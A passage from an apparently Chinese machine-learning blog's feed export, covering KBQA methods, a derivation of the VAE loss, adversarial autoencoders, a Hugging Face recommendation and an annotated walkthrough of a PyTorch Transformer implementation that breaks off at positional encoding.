<h3 id="基于信息检索的方法">基于信息检索的方法</h3>
<p>旨在根据问题检索候选答案集合并对其进行排序，按照以下步骤：</p>
<ol type="1">
<li>确定中心实体，提取问题特定的部分知识子图</li>
<li>问题编码</li>
<li>图推理，沿着相邻实体关系进行语义匹配，传播和聚合信息</li>
<li>按照置信度进行排序</li>
</ol>
<p>优点：端到端训练</p>
<p>缺点：解释性差</p>
<h2 id="挑战与解决方案">挑战与解决方案</h2>
<p>论文总结了两种方法面临的挑战和解决方案，汇总成下面的表格。</p>
<p><img src="summary.png"></p>
<h2 id="总结和展望">总结和展望</h2>
<p>论文主要介绍了两种典型的知识库问答方法，总结了它们面临的挑战及解决方案，并指出复杂 KBQA 未来的可能研究方向：</p>
<ul>
<li>在线学习。已有的复杂 KBQA 系统都是离线学习、在线部署。然而用户的反馈可能是改进 KBQA 的方法。基于此，一些工作开始利用用户反馈去纠正 KBQA 的回答。还有一些工作直接让用户参与到了问题解析过程中。</li>
<li>鲁棒性和可解释性。已有的方法虽然可以在基准数据集上可以取得很好的结果，但是遇到分布之外的情况可能无法很好处理。有研究人员开始提出相关的数据集来解决该问题。</li>
<li>更通用的知识库。知识库往往是不完整的，一些工作开始引入文本、图像来进行更复杂的 KBQA 推理。关于知识库更普遍的定义和更灵活的使用方法能让 KBQA 发展的更好。</li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>问答检索</category>
      </categories>
      <tags>
        <tag>问答</tag>
        <tag>知识库</tag>
        <tag>KBQA</tag>
      </tags>
  </entry>
  <entry>
    <title>变分自编码器 VAE</title>
    <url>/blog/2021/10/07/VAE/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来回顾一下变分自编码器（Variational Autoencoder，VAE），这是 2013 年提出的一种生成模型，时至今日，它的各类变体还活跃在各类会议上。之前我读过它的离散变体 VQ-VAE，这里再回顾一下原本的 VAE。 <span id="more"></span></p>
<h2 id="数学知识">数学知识</h2>
<p>理解 VAE 需要一些信息论和概率论的知识，这里总结一下。</p>
<h3 id="概率统计">概率统计</h3>
<h4 id="数值计算-vs-采样计算">数值计算 vs 采样计算</h4>
<p>对于一个随机变量 X，如果我们想知道 X 的期望<span class="math inline"> \(E(X)\)</span>。如果我们已知 X 的分布函数，很容易可以计算出准确的期望<span class="math inline"> \(E(X)=\sum p(x)x\)</span>（连续型变量替换为积分即可），这当然是最好的。然而很多情况下，我们无法得知准确的分布函数，那么我们可以采用统计量进行估计，对于 n 个随机样本<span class="math inline"> \(x_1,x_2,\dots,x_n\)</span>，<span class="math inline">\(\overline X=\frac{1}{n}\sum x_i\)</span> 就是期望<span class="math inline"> \(E(X)\)</span> 的无偏估计。</p>
<h3 id="信息论">信息论</h3>
<h4 id="信息熵">信息熵</h4>
<p>在信息论中，信息熵衡量了信息的不确定性，公式为<span class="math inline"> \(H(X)=-\sum_{x\in X}p(x)logp(x)\)</span>。以单个事件 x 为例，概率越小的事件的信息熵越大。当一个事件必定会发生时（<span class="math inline">\(p(x)=1\)</span>），其信息熵为 0，没有任何不确定性。对随机变量 X 而说，其信息熵就是<span class="math inline"> \(-logp(x)\)</span> 的期望，熵越大代表随机变量越不确定，很自然可以想到，分布越均匀，变量的状态越不容易确定，其熵越大。</p>
<p>在通信领域，信息熵可以看作对随机变量 X 进行编码所需的最短期望位数，这也被称为编码定理。在通信编码问题中，将随机变量 X 的每个值编码为一个二进制序列，使得序列长度期望最短。同时为了避免混乱，一个序列不能是其他序列的延申。这时编码位数的最短期望位数就是信息熵，有兴趣的同学可以去看看证明。</p>
<h4 id="交叉熵">交叉熵</h4>
<p>对于随机变量<span class="math inline"> \(X\)</span> 的真实分布<span class="math inline"> \(p(x)\)</span>，有时是未知的，我们只有它的近似分布<span class="math inline"> \(q(x)\)</span>，如果按照<span class="math inline"> \(q(x)\)</span> 对变量 X 进行编码，得到的编码长度的期望称为交叉熵，记为<span class="math inline"> \(H(p,q)=-\sum_x p(x)logq(x)\)</span>。容易知道交叉熵是大于等于信息熵的，因为信息熵是最短编码长度。</p>
<h4 id="相对熵kl散度">相对熵（KL 散度）</h4>
<p>对于真实分布<span class="math inline"> \(p\)</span> 和近似分布<span class="math inline"> \(q\)</span>，相对熵为使用近似分布编码得到的编码长度与最短编码长度的差，即交叉熵与信息熵的差，定义为<span class="math inline"> \(D(p||q)=H(p,q)-H(p)\)</span>。KL 散度衡量了两个分布之间的差异，两个分布差异越大，KL 散度越大。不过 KL 散度并不是距离，因为它不是对称的。因此，KL 散度可以用于分类任务中计算真实概率分布与预测的概率分布之间的差异。事实上，<strong>由于这时信息熵为常数，往往将其略去使用交叉熵作为损失函数</strong>。</p>
<h2 id="变分自编码器">变分自编码器</h2>
<p>对于数据集<span class="math inline"> \(D={x_1,x_2,\dots,x_n}\)</span>（假设是很多张猫的图片，每个样本<span class="math inline"> \(x\)</span> 是像素矩阵）。所有可能的猫图构成数据总体<span class="math inline"> \(X\)</span>，即<span class="math inline"> \(x_i\in D\subseteq X\)</span>。<span class="math inline">\(X\)</span> 上存在一个概率分布<span class="math inline"> \(p(x)\)</span>，当我们随机采样一张猫的图片时，这张图片有<span class="math inline"> \(p(x)\)</span> 的概率被采样到。对于非猫图<span class="math inline"> \(y,\ p(y)=0\)</span>。我们希望的是能够找到<span class="math inline"> \(p(x)=p(x^{(1)},x^{(2)},\dots)\)</span> 的准确数学形式，其中<span class="math inline"> \(x^{(1)}\)</span> 代表 x 一维展开后的第 1 个像素，依次类推。如果这个目标能够实现，我们就能分析出<span class="math inline"> \(p(x)\)</span> 这个概率函数，对哪些输入<span class="math inline"> \(x\)</span> 能够取到非 0 概率值（即猫图），进而能够随机采样猫图和非猫图。</p>
<p>如果上述描述还不好理解的话，可以想象一个二维坐标系，以原点为圆心的单位圆上的均匀分布。所有猫图都满足<span class="math inline"> \(x^2+y^2\le1\)</span>，在这个单位圆内外分别随机采样，即可得到猫图和非猫图。</p>
<p>但是事实上，这样的目标是很难实现的。在数理统计里，这是个典型的非参数估计问题，在未知分布形式的情况下，没有办法对分布形式和分布参数进行估计。而且很容易想到，这也绝对是一个非常复杂的概率分布。因此直接对<span class="math inline"> \(p(x)\)</span> 建模是不现实的。我们可以曲线救国。假设存在一个隐变量<span class="math inline"> \(z\)</span> 控制着数据<span class="math inline"> \(x\)</span> 的生成。那么根据<span class="math inline"> \(p(x)=\int p(z)p(x|z)dz\)</span> 可以计算得到<span class="math inline"> \(p(x)\)</span>。然而这个边界似然是不可解的，每一项都不知道具体的数学形式，更不要说还要积分。</p>
<p>那么求其次，我们可以用一个分布<span class="math inline"> \(q(x,z)\)</span> 近似联合概率分布<span class="math inline"> \(p(x,z)\)</span>，那么我们的优化目标就是<span class="math inline"> \(KL(p||q)\)</span> 最小。 <span class="math display">\[
\begin{align}
KL(p||q)&amp;=\int\int p(x,z)log\frac{p(x,z)}{q(x,z)}dzdx \\
&amp;=\int p(x)\int p(z|x)log\frac{p(x,z)}{q(x,z)}dzdx \\
&amp;=E_{x\sim p(x)}\int p(z|x)log\frac{p(x)p(z|x)}{q(x,z)}dz \\
&amp;=E_{x\sim p(x)}\int p(z|x)(log\frac{p(z|x)}{q(x,z)}+logp(x))dz 
\end{align}
\]</span> 而 <span class="math display">\[
\begin{align}
E_{x\sim p(x)}\int q(z|x)logp(x)dz&amp;=E_{x\sim p(x)}logp(x)\int q(z|x)dz\\
&amp;=E_{x\sim p(x)}logp(x)
\end{align}
\]</span> 为一个常数，可以略去。令 <span class="math display">\[
\begin{align}
\mathcal{L}&amp;=E_{x\sim p(x)}\int p(z|x)log\frac{p(z|x)}{q(x,z)}dz\\
&amp;=E_{x\sim p(x)}\int p(z|x)log\frac{p(z|x)}{q(z)q(x|z)}dz\\
&amp;=E_{x\sim p(x)}[\int -p(z|x)logq(x|z)  dz+ \int p(z|x)log\frac{p(z|x)}{q(z)}]dz\\
&amp;=E_{x\sim p(x)}[E_{z\sim p(z|x)}(-log(q(x|z)))+KL(p(z|x)||q(z))]
\end{align}
\]</span> 最小化 KL 与最小化<span class="math inline"> \(\mathcal{L}\)</span> 等价。进而得到了 VAE 的损失函数。只不过与原论文中的符号有些出入，将最后的 KL 项的 p 与 q 调换，即得到了论文中 VAE 的损失函数： <span class="math display">\[
\mathcal{L}=E_{x\sim p(x)}[E_{z\sim p(z|x)}(-log(q(x|z)))+KL(q(z|x)||p(z))]
\]</span> 符号的差别是由于论文直接引入的<span class="math inline"> \(q(z|x)\)</span>，而这里引入的是联合概率分布<span class="math inline"> \(q(x,z)\)</span>。</p>
<p>注意上面的<span class="math inline"> \(\mathcal L\)</span> 是损失函数，而不是<strong>变分下界 ELBO</strong>，VAE 的 ELBO 是损失函数的相反数，引用 VAE 原文中的公式： <span class="math display">\[
\mathcal{L}(\theta,\phi;x^{(i)})=-D_{KL}(q_\phi(z|x^{(i)})||p(z))+\mathbb E_{q_\phi(z|x^{(i)})}[-log(p_\theta(x^{(i)}|z))]
\]</span></p>
<p><strong>ELBO 是要最大化的，而损失函数是要最小化的</strong>。上面的 ELBO 是单个样本的公式，没有对所有样本计算期望，所以形式上有所差异。</p>
<h3 id="说明">说明</h3>
<p>值得注意的是，VAE 的两个损失函数项并不是割裂的。换而言之，VAE 并不是独立地优化每项损失。这很容易理解，如果 VAE 独立优化第二项损失至最小，<span class="math inline">\(p(z)=q(z|x)\)</span>，那么<span class="math inline"> \(q(z|x)\)</span> 将不具备任何<span class="math inline"> \(x\)</span> 的信息，这显然会使得第一项重构损失很大。同理，如果第一项重构损失很小，就意味着<span class="math inline"> \(q(z|x)\)</span> 包含了过多<span class="math inline"> \(x\)</span> 的信息，与<span class="math inline"> \(p(z)\)</span> 的差异（即 KL 项）就会很大。因此，VAE 是在两项损失的相互作用下，取得一个最优解。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://kexue.fm/archives/5253">变分自编码器（一）：原来是这么一回事 - 科学空间</a></li>
<li><a href="https://kexue.fm/archives/5343">变分自编码器（二）：从贝叶斯观点出发 - 科学空间</a></li>
<li><a href="https://kexue.fm/archives/5383">变分自编码器（三）：这样做为什么能成？ - 科学空间</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>生成模型</category>
      </categories>
      <tags>
        <tag>VAE</tag>
        <tag>生成模型</tag>
      </tags>
  </entry>
  <entry>
    <title>对抗自编码器 AAE</title>
    <url>/blog/2021/10/05/aae/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>对抗自编码器（Adversarial Autoencoders，AAE）出自 2015 年的《Adversarial Autoencoders》，其核心想法是将 VAE 与 GAN 结合，来得到一个更好的生成模型。论文首次提出了聚合后验分布（aggregated posterior），并使用它来优化 VAE。事实上这篇论文是在 CV 上生成的，这里只是简单分析下其提出的聚合后验分布及与 VAE 的比较。 <span id="more"></span></p>
<h2 id="对抗自编码器">对抗自编码器</h2>
<p>符号定义：</p>
<ul>
<li><span class="math inline">\(p(z)\)</span>：隐变量<span class="math inline"> \(z\)</span> 的先验分布</li>
<li><span class="math inline"> \(q(z|x)\)</span>：编码器分布</li>
<li><span class="math inline"> \(p(x|z)\)</span>：解码器分布</li>
<li><span class="math inline"> \(p_d(x)\)</span>：数据<span class="math inline"> \(x\)</span> 分布</li>
<li><span class="math inline"> \(p(x)\)</span>：模型的分布</li>
</ul>
<p>定义聚合分布<span class="math inline"> \(q(z)\)</span> 为<span class="math inline"> \(q(z)=\int_xq(z|x)p_d(x)dx\)</span>，AAE 添加了<span class="math inline"> \(q(z)\)</span> 与<span class="math inline"> \(p(z)\)</span> 进行匹配的正则化项，模型结构如下：</p>
<p><img src="architecture.png"></p>
<p>可以看到与 VAE 最大的区别是，VAE 是从后验分布<span class="math inline"> \(q(z|x)\)</span> 中采样、使用 KL 散度逼近后验分布与先验分布，AAE 是使用对抗网络来逼近<span class="math inline"> \(q(z)\)</span> 与<span class="math inline"> \(p(z)\)</span>。在此基础上，引入了一个对抗网络判断隐藏状态来自随机先验分布<span class="math inline"> \(p(z)\)</span> 的采样，还是来自<span class="math inline"> \(q(z)\)</span>。在编码器<span class="math inline"> \(q(z|x)\)</span> 的选择上，论文提供了三种候选：</p>
<ul>
<li>确定性函数，<span class="math inline">\(z\)</span> 仅与<span class="math inline"> \(x\)</span> 相关。</li>
<li>高斯分布，与分布参数和随机性相关。</li>
<li>通用近似后验，<span class="math inline">\(z\)</span> 与<span class="math inline"> \(x\)</span> 和随机噪声<span class="math inline"> \(\eta\)</span> 相关。通用近似是一种近似分布的方法，确定性函数<span class="math inline"> \(f(x,\eta)\)</span>，<span class="math inline">\(\eta\)</span> 是一个随机噪声，因而其可以看作分布的通用近似。</li>
</ul>
<p>论文中最终使用了确定性函数，个人猜测是更好收敛一些。</p>
<h2 id="section"></h2>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>生成模型</category>
      </categories>
      <tags>
        <tag>VAE</tag>
        <tag>GAN</tag>
      </tags>
  </entry>
  <entry>
    <title>NLP 必备网站 Hugging Face</title>
    <url>/blog/2021/09/27/huggingface/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来分享一个网站吧，<a href="https://huggingface.co/">Hugging Face</a>，最大的 NLP 社区，提供了数以千计的预训练模型，涵盖一百余种语言、覆盖几乎所有常见的 NLP 任务。其提供的 transformers 框架提供了简洁高效的 api，可以在无需处理模型细节的前提下，快速进行推理、微调。Hugging Face 至今在 github 上已有超过 5 万个 star，可见其影响力。</p>
<span id="more"></span>
<h2 id="为什么需要hugging-face">为什么需要 Hugging Face</h2>
<p><img src="intro.png"></p>
<p>Hugging Face 不仅仅是若干数据集、预训练模型的资源整合，在此基础上，它还拥有如下特性：</p>
<ul>
<li>开箱即用：对于常见的 NLP 任务，很容易找到对应的预训练模型并进行实验，无需过度关注模型的细节。</li>
<li>多后端支持：Transformers 支持 Pytorch、Jax、Tensorflow 三种框架，无需再为框架微调苦恼。</li>
<li>可定制性：高效封装的同时，Transformers 支持魔改定制模型，模型文件可以单独使用，方便快速实验。</li>
</ul>
<p>鉴于现在 NLP 方向的研究、工程基本都是大规模预训练模型相关，Hugging Face 的重要性就一目了然了。如果你是学生党，Hugging Face 能让你在各类 NLP 比赛中快速使用预训练模型进行实验。如果你已经工作，Hugging Face 也能帮你减少业务问题上的试错成本，快速把任务跑起来。</p>
<h2 id="有用的链接">有用的链接</h2>
<ol type="1">
<li><a href="https://github.com/huggingface/transformers">github 链接</a>，可以对其使用方法、支持的模型有个快速的认识。</li>
<li><a href="https://huggingface.co/">Hugging Face 官网</a>，试试推理 api、看一看文档。</li>
<li><a href="https://huggingface.co/course/chapter0?fw=pt">Hugging Face Course</a>，Hugging Face 出品的官方课程，目前更新了前四章，基本上是 step-by-step 的教你从推理到微调任务如何构建和完成。</li>
</ol>
<h2 id="总结">总结</h2>
<p>没错，这么短的一篇博客还有总结。今天刚刚看完 Hugging Face 的前四章课程，感觉学到了很多。早点知道也不会走一些弯路了，一起加油吧！</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>Hugging Face</tag>
        <tag>工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Transformer-code</title>
    <url>/blog/2021/09/05/Transformer-code/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来读一下《<a href="https://arxiv.org/abs/1706.03762">Attention is All You Need</a>》的代码，也就是 Transformer。pytorch 代码<a href="https://github.com/jadore801120/attention-is-all-you-need-pytorch">地址</a>)。</p>
<span id="more"></span>
<h2 id="目录结构">目录结构</h2>
<p>Transformer 文件夹下有以下文件：</p>
<ul>
<li>Constants.py：模型常量定义</li>
<li> Layers.py：编码器和解码器层定义</li>
<li> Models.py：模型定义</li>
<li> Modules.py：工具模块</li>
<li> Optim.py：优化模块</li>
<li> SubLayer.py：多头注意力机制等子层</li>
<li> Translator.py：翻译 beam search</li>
</ul>
<p>顶层目录下有以下文件：</p>
<ul>
<li>train.py：训练入口，实例化模型、优化器等，进行优化迭代</li>
<li> learn_bpe.py：bpe 学习词表</li>
<li> apply_bpe.py：使用 bpe 得到的词表将文本进行编码</li>
<li> translate.py：加载模型进行翻译</li>
</ul>
<p>下面逐一进行分析模型相关文件，剩下的文件等到下次再读吧。</p>
<h2 id="模型解析">模型解析</h2>
<p>下面按照依赖顺序对各文件进行解析。</p>
<h3 id="constants.py">Constants.py</h3>
<p>文件内容非常简单，分别为填充、未知、起始、终止四种 token 的定义。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">PAD_WORD = <span class="string">'&lt;blank&gt;'</span> <span class="comment"># 填充token</span></span><br><span class="line">UNK_WORD = <span class="string">'&lt;unk&gt;'</span> <span class="comment"># 未知token</span></span><br><span class="line">BOS_WORD = <span class="string">'&lt;s&gt;'</span> <span class="comment"># 起始token</span></span><br><span class="line">EOS_WORD = <span class="string">'&lt;/s&gt;'</span> <span class="comment"># 结束token</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="modules.py">Modules.py</h3>
<p>定义了标量化点乘注意力机制类。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScaledDotProductAttention</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' Scaled Dot-Product Attention '''</span></span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, temperature, attn_dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.temperature = temperature <span class="comment"># softmax的温度系数，论文中为\sqrt d_k</span></span><br><span class="line">        self.dropout = nn.Dropout(attn_dropout) <span class="comment"># 原论文dropout比例即为0.1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, q, k, v, mask=<span class="literal">None</span></span>):</span></span><br><span class="line">		<span class="string">'''</span></span><br><span class="line"><span class="string">		q,k:  bsz x n_head x lq  x d_k</span></span><br><span class="line"><span class="string">		v: bsz x n_head x lq x d_v</span></span><br><span class="line"><span class="string">		'''</span></span><br><span class="line">        attn = torch.matmul(q / self.temperature, k.transpose(<span class="number">2</span>, <span class="number">3</span>)) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            attn = attn.masked_fill(mask == <span class="number">0</span>, -<span class="number">1e9</span>) <span class="comment"># 填充位置的注意力掩码，避免信息泄露等问题</span></span><br><span class="line"></span><br><span class="line">        attn = self.dropout(F.softmax(attn, dim=-<span class="number">1</span>)) <span class="comment"># 注意力的dropout</span></span><br><span class="line">        output = torch.matmul(attn, v) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> output, attn</span><br></pre></td></tr></tbody></table></figure>
<h3 id="sublayers.py">SubLayers.py</h3>
<p>多头注意力机制定义：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MultiHeadAttention</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' Multi-Head Attention module '''</span></span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">	n_head：注意力头数</span></span><br><span class="line"><span class="string">	d_model：词嵌入向量维度</span></span><br><span class="line"><span class="string">	d_k：query,key向量维度</span></span><br><span class="line"><span class="string">	d_v：value向量维度，d_v*n_head即为注意力输出的维度</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n_head, d_model, d_k, d_v, dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.n_head = n_head</span><br><span class="line">        self.d_k = d_k</span><br><span class="line">        self.d_v = d_v</span><br><span class="line">		<span class="comment"># query key value 矩阵</span></span><br><span class="line">        self.w_qs = nn.Linear(d_model, n_head * d_k, bias=<span class="literal">False</span>)</span><br><span class="line">        self.w_ks = nn.Linear(d_model, n_head * d_k, bias=<span class="literal">False</span>)</span><br><span class="line">        self.w_vs = nn.Linear(d_model, n_head * d_v, bias=<span class="literal">False</span>)</span><br><span class="line">        self.fc = nn.Linear(n_head * d_v, d_model, bias=<span class="literal">False</span>) <span class="comment">#全连接层</span></span><br><span class="line"></span><br><span class="line">        self.attention = ScaledDotProductAttention(temperature=d_k ** <span class="number">0.5</span>) <span class="comment">#注意力计算</span></span><br><span class="line"></span><br><span class="line">        self.dropout = nn.Dropout(dropout)</span><br><span class="line">        self.layer_norm = nn.LayerNorm(d_model, eps=<span class="number">1e-6</span>) <span class="comment"># 层标准化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, q, k, v, mask=<span class="literal">None</span></span>):</span></span><br><span class="line"></span><br><span class="line">        d_k, d_v, n_head = self.d_k, self.d_v, self.n_head</span><br><span class="line">        sz_b, len_q, len_k, len_v = q.size(<span class="number">0</span>), q.size(<span class="number">1</span>), k.size(<span class="number">1</span>), v.size(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        residual = q</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Pass through the pre-attention projection: b x lq x (n*dv)</span></span><br><span class="line">        <span class="comment"># Separate different heads: b x lq x n x dv</span></span><br><span class="line">        q = self.w_qs(q).view(sz_b, len_q, n_head, d_k)</span><br><span class="line">        k = self.w_ks(k).view(sz_b, len_k, n_head, d_k)</span><br><span class="line">        v = self.w_vs(v).view(sz_b, len_v, n_head, d_v)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Transpose for attention dot product: b x n x lq x dv</span></span><br><span class="line">        q, k, v = q.transpose(<span class="number">1</span>, <span class="number">2</span>), k.transpose(<span class="number">1</span>, <span class="number">2</span>), v.transpose(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            mask = mask.unsqueeze(<span class="number">1</span>)   <span class="comment"># For head axis broadcasting.</span></span><br><span class="line">	    <span class="comment"># q为注意力的输出</span></span><br><span class="line">        q, attn = self.attention(q, k, v, mask=mask)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Transpose to move the head dimension back: b x lq x n x dv</span></span><br><span class="line">        <span class="comment"># Combine the last two dimensions to concatenate all the heads together: b x lq x (n*dv)</span></span><br><span class="line">        q = q.transpose(<span class="number">1</span>, <span class="number">2</span>).contiguous().view(sz_b, len_q, -<span class="number">1</span>)</span><br><span class="line">        q = self.dropout(self.fc(q))</span><br><span class="line">        q += residual</span><br><span class="line"></span><br><span class="line">        q = self.layer_norm(q)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> q, attn</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>前馈神经网络子层、残差层定义：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PositionwiseFeedForward</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' A two-feed-forward-layer module '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, d_in, d_hid, dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.w_1 = nn.Linear(d_in, d_hid) <span class="comment"># position-wise</span></span><br><span class="line">        self.w_2 = nn.Linear(d_hid, d_in) <span class="comment"># position-wise</span></span><br><span class="line">        self.layer_norm = nn.LayerNorm(d_in, eps=<span class="number">1e-6</span>)</span><br><span class="line">        self.dropout = nn.Dropout(dropout)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line"></span><br><span class="line">        residual = x</span><br><span class="line"></span><br><span class="line">        x = self.w_2(F.relu(self.w_1(x)))</span><br><span class="line">        x = self.dropout(x)</span><br><span class="line">        x += residual <span class="comment"># 残差计算</span></span><br><span class="line"></span><br><span class="line">        x = self.layer_norm(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="layers.py">Layers.py</h3>
<p>编码器层类（非常简单，将多头注意力机制与前馈神经网络拼接起来即可）：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">''' Define the Layers '''</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> transformer.SubLayers <span class="keyword">import</span> MultiHeadAttention, PositionwiseFeedForward</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncoderLayer</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' Compose with two layers '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, d_model, d_inner, n_head, d_k, d_v, dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(EncoderLayer, self).__init__()</span><br><span class="line">        self.slf_attn = MultiHeadAttention(n_head, d_model, d_k, d_v, dropout=dropout)</span><br><span class="line">        self.pos_ffn = PositionwiseFeedForward(d_model, d_inner, dropout=dropout)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, enc_input, slf_attn_mask=<span class="literal">None</span></span>):</span></span><br><span class="line">        enc_output, enc_slf_attn = self.slf_attn(</span><br><span class="line">            enc_input, enc_input, enc_input, mask=slf_attn_mask)</span><br><span class="line">        enc_output = self.pos_ffn(enc_output)</span><br><span class="line">        <span class="keyword">return</span> enc_output, enc_slf_attn</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>解码器层类：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DecoderLayer</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' Compose with three layers '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, d_model, d_inner, n_head, d_k, d_v, dropout=<span class="number">0.1</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DecoderLayer, self).__init__()</span><br><span class="line">        self.slf_attn = MultiHeadAttention(n_head, d_model, d_k, d_v, dropout=dropout)</span><br><span class="line">        self.enc_attn = MultiHeadAttention(n_head, d_model, d_k, d_v, dropout=dropout) <span class="comment"># 解码器对编码器输出的注意力</span></span><br><span class="line">        self.pos_ffn = PositionwiseFeedForward(d_model, d_inner, dropout=dropout)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">            self, dec_input, enc_output,</span></span></span><br><span class="line"><span class="params"><span class="function">            slf_attn_mask=<span class="literal">None</span>, dec_enc_attn_mask=<span class="literal">None</span></span>):</span></span><br><span class="line">        dec_output, dec_slf_attn = self.slf_attn(</span><br><span class="line">            dec_input, dec_input, dec_input, mask=slf_attn_mask) <span class="comment"># 解码器的自注意力</span></span><br><span class="line">        dec_output, dec_enc_attn = self.enc_attn(</span><br><span class="line">            dec_output, enc_output, enc_output, mask=dec_enc_attn_mask) <span class="comment"># 解码器对编码器输出的注意力</span></span><br><span class="line">        dec_output = self.pos_ffn(dec_output) <span class="comment"># 前馈神经网络</span></span><br><span class="line">        <span class="keyword">return</span> dec_output, dec_slf_attn, dec_enc_attn</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="models.py">Models.py</h3>
<p>Models.py 是模型定义核心文件。</p>
<p>工具函数：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pad_mask</span>(<span class="params">seq, pad_idx</span>):</span> <span class="comment"># 获取序列的MASK（填充位置为0）</span></span><br><span class="line">    <span class="keyword">return</span> (seq != pad_idx).unsqueeze(-<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_subsequent_mask</span>(<span class="params">seq</span>):</span> <span class="comment"># 获取序列的所有MASK（长度为1,2,...n）</span></span><br><span class="line">    <span class="string">''' For masking out the subsequent info. '''</span></span><br><span class="line">    sz_b, len_s = seq.size()</span><br><span class="line">    subsequent_mask = (<span class="number">1</span> - torch.triu(</span><br><span class="line">        torch.ones((<span class="number">1</span>, len_s, len_s), device=seq.device), diagonal=<span class="number">1</span>)).<span class="built_in">bool</span>()</span><br><span class="line">    <span class="keyword">return</span> subsequent_mask</span><br></pre></td></tr></tbody></table></figure>
<p>位置编码：</p>
